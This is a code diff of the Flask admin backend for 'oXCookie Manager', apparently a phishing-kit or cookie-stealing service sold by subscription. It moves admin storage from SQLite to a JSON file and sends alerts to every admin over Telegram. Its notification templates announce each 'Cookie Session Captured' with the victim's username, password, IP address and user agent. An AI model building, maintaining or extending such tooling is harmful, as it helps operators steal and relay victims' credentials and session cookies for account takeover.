+                                print(f"[OK] Extension notification sent to {sent_count} admin(s)")
                             else:
-                                safe_print(f"[ERROR] Extension notification failed to send")
+                                print(f"[ERROR] Extension notification failed - no admins received the message")
                         except Exception as e:
-                            safe_print(f"[ERROR] Error sending extension notification: {e}")
+                            print(f"[ERROR] Error sending extension notification: {e}")
                             import traceback
-                            try:
-                                safe_print(f"[ERROR] Traceback: {traceback.format_exc()}")
-                            except:
-                                print(f"[ERROR] Traceback: (error printing traceback)")
+                            traceback.print_exc()
                     else:
-                        safe_print(f"[DEBUG] Extension notification skipped: subscription_days={subscription_days}, days_added={days_added}, updated_user={updated_user is not None}")
+                        print(f"[DEBUG] Extension notification skipped: subscription_days={subscription_days}, days_added={days_added}, updated_user={updated_user is not None}")
                     
                     # Send notification if status changed
                     if subscription_status and subscription_status != old_status and updated_user:
@@ -1099,76 +1165,75 @@ def update_admin(username):
                                 message = message.replace("{username}", escape_markdownv2(username))
                                 message = message.replace("{status}", "active")
                             
-                            send_telegram_notification(
-                                config.get("telegr_chatid"),
-                                config.get("telegram_token"),
+                            # Send notification to all admins
+                            sent_count, failed_count = send_notifications_to_all_admins(
                                 message,
                                 file_path=None,
-                                support_telegram=support_telegram
+                                session_id=None,
+                                web_url=None,
+                                support_telegram=support_telegram,
+                                config=config
                             )
+                            if sent_count > 0:
+                                print(f"[OK] Status change notification sent to {sent_count} admin(s)")
+                            else:
+                                print(f"[WARNING] Status change notification failed - no admins received the message")
                         except Exception as e:
-                            safe_print(f"Error sending status change notification: {e}")
+                            print(f"Error sending status change notification: {e}")
             except Exception as e:
-                safe_print(f"Error in notification sending: {e}")
+                print(f"Error in notification sending: {e}")
             
             return jsonify({"status": "success", "message": "Admin updated successfully"})
         else:
-            return jsonify({"status": "error", "message": "Failed to update user"}), 500
+            return jsonify({"status": "error", "message": "Failed to save changes"}), 500
             
-    except ValueError as e:
-        return jsonify({"status": "error", "message": str(e)}), 400
     except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+        return jsonify({"status": "error", "message": str(e)}), 400
 
 @app.route('/api/admins/<username>', methods=['DELETE'])
 @super_admin_required
 def delete_admin(username):
-    """Delete admin user using SQLite"""
+    """Delete admin user"""
     try:
-        # Delete user using SQLite (with transaction, prevents deleting super_admin)
-        success = delete_user(username)
+        auth_data = load_auth()
+        users = auth_data.get("users", [])
         
-        if success:
+        # Don't allow deleting super_admin
+        original_count = len(users)
+        users = [u for u in users if not (u.get('username') == username and u.get('role') != 'super_admin')]
+        
+        if len(users) == original_count:
+            return jsonify({"status": "error", "message": "User not found or cannot delete super admin"}), 404
+        
+        auth_data["users"] = users
+        if save_auth(auth_data):
             return jsonify({"status": "success", "message": "Admin deleted successfully"})
         else:
-            return jsonify({"status": "error", "message": "User not found or cannot delete super admin"}), 404
+            return jsonify({"status": "error", "message": "Failed to save changes"}), 500
             
-    except ValueError as e:
-        return jsonify({"status": "error", "message": str(e)}), 400
     except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+        return jsonify({"status": "error", "message": str(e)}), 400
 
 @app.route('/api/admins/<username>/ip-whitelist', methods=['GET'])
 @super_admin_required
 def get_user_ip_whitelist(username):
-    """Get allowed IPs for a user from SQLite"""
+    """Get allowed IPs for a user"""
     try:
-        user = get_user_by_username(username)
+        auth_data = load_auth()
+        users = auth_data.get("users", [])
+        
+        user = next((u for u in users if u.get('username') == username), None)
         if not user:
             return jsonify({"status": "error", "message": "User not found"}), 404
-        
-        # Parse JSON fields
-        allowed_ips_json = user.get('allowed_ips', '[]')
-        failed_attempts_json = user.get('failed_ip_attempts', '{}')
-        
-        try:
-            allowed_ips = json.loads(allowed_ips_json) if allowed_ips_json else []
-        except:
-            allowed_ips = []
-        
-        try:
-            failed_ip_attempts = json.loads(failed_attempts_json) if failed_attempts_json else {}
-        except:
-            failed_ip_attempts = {}
         
         return jsonify({
             "status": "success",
             "username": username,
-            "allowed_ips": allowed_ips,
-            "account_locked": bool(user.get('account_locked', 0)),
+            "allowed_ips": user.get('allowed_ips', []),
+            "account_locked": user.get('account_locked', False),
             "lock_reason": user.get('lock_reason', ''),
             "locked_at": user.get('locked_at', ''),
-            "failed_ip_attempts": failed_ip_attempts
+            "failed_ip_attempts": user.get('failed_ip_attempts', {})
         })
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 400
@@ -1176,7 +1241,7 @@ def get_user_ip_whitelist(username):
 @app.route('/api/admins/<username>/ip-whitelist', methods=['POST'])
 @super_admin_required
 def set_user_ip_whitelist(username):
-    """Set allowed IPs for a user using SQLite with transaction"""
+    """Set allowed IPs for a user"""
     try:
         data = request.json
         allowed_ips = data.get('allowed_ips', [])
@@ -1184,51 +1249,53 @@ def set_user_ip_whitelist(username):
         if not isinstance(allowed_ips, list):
             return jsonify({"status": "error", "message": "allowed_ips must be a list"}), 400
         
-        # Update IP whitelist using SQLite (with transaction)
-        update_user_ip_whitelist(username, allowed_ips)
+        auth_data = load_auth()
+        users = auth_data.get("users", [])
         
-        return jsonify({
-            "status": "success", 
-            "message": f"IP whitelist updated for {username}",
-            "allowed_ips": allowed_ips
-        })
+        user_found = False
+        for user in users:
+            if user.get('username') == username:
+                user_found = True
+                user['allowed_ips'] = allowed_ips
+                # Clear failed attempts when IPs are updated
+                user['failed_ip_attempts'] = {}
+                break
+        
+        if not user_found:
+            return jsonify({"status": "error", "message": "User not found"}), 404
+        
+        auth_data["users"] = users
+        if save_auth(auth_data):
+            return jsonify({
+                "status": "success", 
+                "message": f"IP whitelist updated for {username}",
+                "allowed_ips": allowed_ips
+            })
+        else:
+            return jsonify({"status": "error", "message": "Failed to save changes"}), 500
             
-    except ValueError as e:
-        return jsonify({"status": "error", "message": str(e)}), 404
     except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+        return jsonify({"status": "error", "message": str(e)}), 400
 
 @app.route('/api/admins/locked-accounts', methods=['GET'])
 @super_admin_required
 def get_locked_accounts():
-    """Get all locked accounts from SQLite"""
+    """Get all locked accounts"""
     try:
-        locked_users = get_locked_accounts()
+        auth_data = load_auth()
+        users = auth_data.get("users", [])
         
         locked_accounts = []
-        for user in locked_users:
-            # Parse JSON fields
-            allowed_ips_json = user.get('allowed_ips', '[]')
-            failed_attempts_json = user.get('failed_ip_attempts', '{}')
-            
-            try:
-                allowed_ips = json.loads(allowed_ips_json) if allowed_ips_json else []
-            except:
-                allowed_ips = []
-            
-            try:
-                failed_ip_attempts = json.loads(failed_attempts_json) if failed_attempts_json else {}
-            except:
-                failed_ip_attempts = {}
-            
-            locked_accounts.append({
-                "username": user.get('username'),
-                "role": user.get('role'),
-                "lock_reason": user.get('lock_reason', ''),
-                "locked_at": user.get('locked_at', ''),
-                "failed_ip_attempts": failed_ip_attempts,
-                "allowed_ips": allowed_ips
-            })
+        for user in users:
+            if user.get('account_locked', False):
+                locked_accounts.append({
+                    "username": user.get('username'),
+                    "role": user.get('role'),
+                    "lock_reason": user.get('lock_reason', ''),
+                    "locked_at": user.get('locked_at', ''),
+                    "failed_ip_attempts": user.get('failed_ip_attempts', {}),
+                    "allowed_ips": user.get('allowed_ips', [])
+                })
         
         return jsonify({
             "status": "success",
@@ -1241,91 +1308,52 @@ def get_locked_accounts():
 @app.route('/api/admins/<username>/restore-access', methods=['POST'])
 @super_admin_required
 def restore_user_access(username):
-    """Restore access for a locked user and optionally add new IP using SQLite"""
+    """Restore access for a locked user and optionally add new IP"""
     try:
         data = request.json
         new_ip = data.get('new_ip', None)  # Optional: add new IP to whitelist
         
-        user = get_user_by_username(username)
-        if not user:
+        auth_data = load_auth()
+        users = auth_data.get("users", [])
+        
+        user_found = False
+        for user in users:
+            if user.get('username') == username:
+                user_found = True
+                
+                # Unlock account
+                user['account_locked'] = False
+                user.pop('lock_reason', None)
+                user.pop('locked_at', None)
+                user['failed_ip_attempts'] = {}  # Clear failed attempts
+                
+                # Add new IP to whitelist if provided
+                if new_ip:
+                    allowed_ips = user.get('allowed_ips', [])
+                    if new_ip not in allowed_ips:
+                        allowed_ips.append(new_ip)
+                        user['allowed_ips'] = allowed_ips
+                
+                break
+        
+        if not user_found:
             return jsonify({"status": "error", "message": "User not found"}), 404
         
-        # Get current allowed IPs
-        allowed_ips_json = user.get('allowed_ips', '[]')
-        try:
-            allowed_ips = json.loads(allowed_ips_json) if allowed_ips_json else []
-        except:
-            allowed_ips = []
-        
-        # Add new IP if provided
-        if new_ip and new_ip not in allowed_ips:
-            allowed_ips.append(new_ip)
-        
-        # Restore access using SQLite (with transaction)
-        # First unlock the account
-        update_user_ip_access(
-            username,
-            account_locked=False,
-            clear_failed=True
-        )
-        
-        # Then update IP whitelist if new IP was added
-        if new_ip:
-            update_user_ip_whitelist(username, allowed_ips)
-        
-        # Get updated user for response
-        updated_user = get_user_by_username(username)
-        
-        if updated_user:
-            # Send notification to user that access has been restored
-            try:
-                config = load_config()
-                if config.get("telegram_enable") and config.get("telegram_token") and config.get("telegr_chatid"):
-                    support_telegram = config.get("support_telegram")
-                    
-                    # Get customizable restore notification template
-                    restore_template = config.get("notification_account_restore",
-                        "✅ *Account Access Restored\\!*\n\nYour account access has been restored\\.\n\nUser: *{username}*{new_ip_section}\n\nYou can now log in again\\.")
-                    
-                    # Format message with placeholders
-                    new_ip_section = ""
-                    if new_ip:
-                        new_ip_section = f"\n\nNew IP address `{new_ip}` has been added to your whitelist\\."
-                    
-                    restore_message = restore_template.replace("{username}", escape_markdownv2(username))
-                    restore_message = restore_message.replace("{new_ip_section}", new_ip_section)
-                    
-                    from notifications import send_telegram_notification
-                    send_telegram_notification(
-                        chat_id=config.get("telegr_chatid"),
-                        token=config.get("telegram_token"),
-                        message=restore_message,
-                        support_telegram=support_telegram
-                    )
-                    safe_print(f"[RESTORE] Notification sent to {username}")
-            except Exception as e:
-                safe_print(f"[RESTORE] Error sending notification: {e}")
-            
+        auth_data["users"] = users
+        if save_auth(auth_data):
             message = f"Access restored for {username}"
             if new_ip:
                 message += f" and IP {new_ip} added to whitelist"
-            
-            # Parse allowed_ips from updated_user
-            allowed_ips_json = updated_user.get('allowed_ips', '[]')
-            try:
-                allowed_ips_list = json.loads(allowed_ips_json) if allowed_ips_json else []
-            except:
-                allowed_ips_list = []
             
             return jsonify({
                 "status": "success",
                 "message": message,
                 "username": username,
                 "account_locked": False,
-                "allowed_ips": allowed_ips_list
+                "allowed_ips": user.get('allowed_ips', [])
             })
         else:
-            return jsonify({"status": "error", "message": "Failed to restore access"}), 500
+            return jsonify({"status": "error", "message": "Failed to save changes"}), 500
             
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 400
@@ -1366,14 +1394,19 @@ def update_maintenance_message():
                         maintenance_message = f"*⚠️ Maintenance Alert\\!*\n\n{escape_markdownv2(config.get('maintenance_message', ''))}"
                         support_telegram = config.get("support_telegram")
                         
-                        # Send to main chat (can be extended to per-user chat IDs)
-                        send_telegram_notification(
-                            config.get("telegr_chatid"),
-                            config.get("telegram_token"),
+                        # Send maintenance notification to all admins
+                        sent_count, failed_count = send_notifications_to_all_admins(
                             maintenance_message,
                             file_path=None,
-                            support_telegram=support_telegram
+                            session_id=None,
+                            web_url=None,
+                            support_telegram=support_telegram,
+                            config=config
                         )
+                        if sent_count > 0:
+                            print(f"[OK] Maintenance notification sent to {sent_count} admin(s)")
+                        else:
+                            print(f"[WARNING] Maintenance notification failed - no admins received the message")
                 except Exception as e:
                     print(f"Error sending maintenance notification: {e}")
             
@@ -1389,16 +1422,11 @@ def get_notification_settings():
     """Get notification text settings"""
     config = load_config()
     return jsonify({
-        "incoming_cookie": config.get("notification_incoming_cookie", "*🍪 New Cookie Session Captured\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Created:* `{create_time}`\n• *Updated:* `{update_time}`\n━━━━━━━━━━━━━━━━━━━━"),
-        "updated_cookie": config.get("notification_updated_cookie", "*🔄 Cookie Session Updated\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Created:* `{create_time}`\n• *Updated:* `{update_time}`\n━━━━━━━━━━━━━━━━━━━━"),
+        "incoming_cookie": config.get("notification_incoming_cookie", "*🍪 New Cookie Session Captured\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Timestamp:* `{time}`\n━━━━━━━━━━━━━━━━━━━━"),
         "status_update": config.get("notification_status_update", "*⚙️ System Status Changed*\n\n━━━━━━━━━━━━━━━━━━━━\n*Current Status:*\n• *Monitoring:* `{monitoring_status}`\n• *Telegram:* `{telegram_status}`\n• *Discord:* `{discord_status}`\n• *Email:* `{email_status}`\n*Admin Information:*\n• *Admin Status:* `{admin_status}`\n• *Subscription End Date:* `{subscription_end_date}`\n• *Updated At:* `{time}`\n━━━━━━━━━━━━━━━━━"),
         "subscription_warning": config.get("notification_subscription_warning", "*⏰ Subscription Expiring Soon\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Account:* `{username}`\n*Current Status:* `{status}`\n*Expiry Date:* `{expiry_date}`\n*Days Remaining:* `{days_remaining}`\n\nPlease contact support to renew your subscription\\.\n━━━━━━━━━━━━━━━━━━━━"),
         "account_extension": config.get("notification_account_extension", "*🎉 Subscription Extended\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Account:* `{username}`\n*Days Added:* `{days_added}`\n*New Expiry Date:* `{expiry_date}`\n*Status:* `{status}`\n━━━━━━━━━━━━━━━━━━━━"),
-        "startup": config.get("notification_startup", "*🚀 oXCookie Manager Started\\!*\n\nSystem is now online and ready to monitor sessions\\."),
-        "ip_warning_first": config.get("ip_warning_first", "⚠️ *First Warning*\n\nUnauthorized IP access attempt detected for user: *{username}*\n\nIP Address: `{ip}`\n\nThis is your first warning\\. Please use an authorized IP address\\.\n\nRemaining attempts: *2*"),
-        "ip_warning_second": config.get("ip_warning_second", "🔴 *Second Warning*\n\nUnauthorized IP access attempt detected for user: *{username}*\n\nIP Address: `{ip}`\n\nThis is your second warning\\. One more unauthorized attempt will result in account lockout\\.\n\nRemaining attempts: *1*"),
-        "ip_warning_locked": config.get("ip_warning_locked", "🚫 *Account Locked*\n\nYour account has been locked due to unauthorized IP access attempts\\.\n\nUser: *{username}*\nUnauthorized IP: `{ip}`\n\nYour account has been locked after 3 unauthorized IP access attempts\\. Please contact support to restore access\\."),
-        "account_restore": config.get("notification_account_restore", "✅ *Account Access Restored\\!*\n\nYour account access has been restored\\.\n\nUser: *{username}*{new_ip_section}\n\nYou can now log in again\\.")
+        "startup": config.get("notification_startup", "*🚀 oXCookie Manager Started\\!*\n\nSystem is now online and ready to monitor sessions\\.")
     })
 
 @app.route('/api/notifications', methods=['POST'])
@@ -1409,15 +1437,10 @@ def update_notification_settings():
         data = request.json
         config = load_config()
         config["notification_incoming_cookie"] = data.get("incoming_cookie", "")
-        config["notification_updated_cookie"] = data.get("updated_cookie", "")
         config["notification_status_update"] = data.get("status_update", "")
         config["notification_subscription_warning"] = data.get("subscription_warning", "")
         config["notification_account_extension"] = data.get("account_extension", "")
         config["notification_startup"] = data.get("startup", "")
-        config["ip_warning_first"] = data.get("ip_warning_first", "")
-        config["ip_warning_second"] = data.get("ip_warning_second", "")
-        config["ip_warning_locked"] = data.get("ip_warning_locked", "")
-        config["notification_account_restore"] = data.get("account_restore", "")
         
         if save_config(config):
             return jsonify({"status": "success", "message": "Notification settings updated"})
@@ -1518,32 +1541,32 @@ def test_session_notification():
             message = message.replace("{useragent}", escape_markdownv2(useragent))
             message = message.replace("{time}", escape_markdownv2(time_str))
             
-            # Send notification directly to check success
+            # Send notification to all admins
             web_url = config.get("web_url", "http://localhost:5004")
             support_telegram = config.get("support_telegram")
             
-            message_id = send_telegram_notification(
-                config.get("telegr_chatid"),
-                config.get("telegram_token"),
+            sent_count, failed_count = send_notifications_to_all_admins(
                 message,
                 file_path=None,
                 session_id=session_id,
                 web_url=web_url,
-                support_telegram=support_telegram
+                support_telegram=support_telegram,
+                config=config
             )
             
-            if message_id:
+            if sent_count > 0:
                 return jsonify({
                     "status": "success",
-                    "message": f"Test notification sent successfully using session ID: {latest_session.get('id', 0)}",
+                    "message": f"Test notification sent successfully to {sent_count} admin(s) using session ID: {latest_session.get('id', 0)}",
                     "session_id": latest_session.get('id', 0),
                     "username": latest_session.get('username', 'N/A'),
-                    "message_id": message_id
+                    "sent_count": sent_count,
+                    "failed_count": failed_count
                 })
             else:
                 return jsonify({
                     "status": "error",
-                    "message": "Failed to send test notification. The notification was not sent. Check server logs for details.",
+                    "message": "Failed to send test notification. No admins received the message. Make sure at least one admin has configured Telegram bot token and chat ID.",
                     "session_id": latest_session.get('id', 0),
                     "username": latest_session.get('username', 'N/A')
                 }), 500
@@ -1594,11 +1617,8 @@ def send_subscription_notification():
         if not user:
             return jsonify({"status": "error", "message": "Admin user not found"}), 404
         
-        # Get admin's Telegram chat ID (if available) or use default chat ID
-        chat_id = config.get("telegr_chatid")  # For now, send to main chat. Can be extended to per-user chat IDs
-        
-        if not config.get("telegram_enable") or not config.get("telegram_token") or not chat_id:
-            return jsonify({"status": "error", "message": "Telegram not configured"}), 400
+        if not config.get("telegram_enable"):
+            return jsonify({"status": "error", "message": "Telegram not enabled"}), 400
         
         # Get notification message
         if notification_type == "expired":
@@ -1619,19 +1639,20 @@ def send_subscription_notification():
         # Get support Telegram
         support_telegram = config.get("support_telegram")
         
-        # Send notification
-        message_id = send_telegram_notification(
-            chat_id,
-            config.get("telegram_token"),
+        # Send notification to all admins
+        sent_count, failed_count = send_notifications_to_all_admins(
             message,
             file_path=None,  # No file for subscription notifications
-            support_telegram=support_telegram
+            session_id=None,
+            web_url=None,
+            support_telegram=support_telegram,
+            config=config
         )
         
-        if message_id:
-            return jsonify({"status": "success", "message": "Notification sent successfully"})
+        if sent_count > 0:
+            return jsonify({"status": "success", "message": f"Notification sent successfully to {sent_count} admin(s)"})
         else:
-            return jsonify({"status": "error", "message": "Failed to send notification"}), 500
+            return jsonify({"status": "error", "message": "Failed to send notification. Make sure at least one admin has configured Telegram bot token and chat ID."}), 500
             
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 400
@@ -1834,10 +1855,9 @@ def startup_check():
     CONFIG_DIR.mkdir(parents=True, exist_ok=True)
     print(f"[OK] Config directory: {CONFIG_DIR}")
     
-    # Check database
-    from admin_db import get_all_users
-    users = get_all_users()
-    print(f"[OK] SQLite database initialized: {len(users)} user(s) found")
+    # Check auth
+    auth = load_auth()
+    print(f"[OK] Auth initialized: username={auth.get('username')}")
     
     # Check database
     config = load_config()
@@ -1878,26 +1898,27 @@ def send_startup_notification():
         config = load_config()
         
         # Check if Telegram is enabled
-        if not config.get("telegram_enable") or not config.get("telegram_token") or not config.get("telegr_chatid"):
+        if not config.get("telegram_enable"):
             return
         
         # Get startup message template from config
         startup_message = config.get("notification_startup", 
             "*🚀 oXCookie Manager Started\\!*\n\nSystem is now online and ready to monitor sessions\\.")
         
-        # Send notification
-        message_id = send_telegram_notification(
-            config.get("telegr_chatid"),
-            config.get("telegram_token"),
+        # Send startup notification to all admins
+        sent_count, failed_count = send_notifications_to_all_admins(
             startup_message,
             file_path=None,  # No file for startup
-            support_telegram=config.get("support_telegram")
+            session_id=None,
+            web_url=None,
+            support_telegram=config.get("support_telegram"),
+            config=config
         )
         
-        if message_id:
-            print("[OK] Startup notification sent to Telegram")
+        if sent_count > 0:
+            print(f"[OK] Startup notification sent to {sent_count} admin(s)")
         else:
-            print("[WARNING] Failed to send startup notification")
+            print("[WARNING] Failed to send startup notification - no admins received the message")
     except Exception as e:
         print(f"[WARNING] Error sending startup notification: {e}")
 
@@ -1905,12 +1926,8 @@ if __name__ == '__main__':
     # Create config directory
     CONFIG_DIR.mkdir(parents=True, exist_ok=True)
     
-    # Initialize SQLite database and migrate from JSON if needed
-    from admin_db import init_database, migrate_from_json
-    init_database()
-    migrated = migrate_from_json()
-    if migrated:
-        safe_print("[MIGRATION] Successfully migrated admin data from JSON to SQLite")
+    # Initialize auth if needed
+    load_auth()
     
     # Send startup notification
     send_startup_notification()
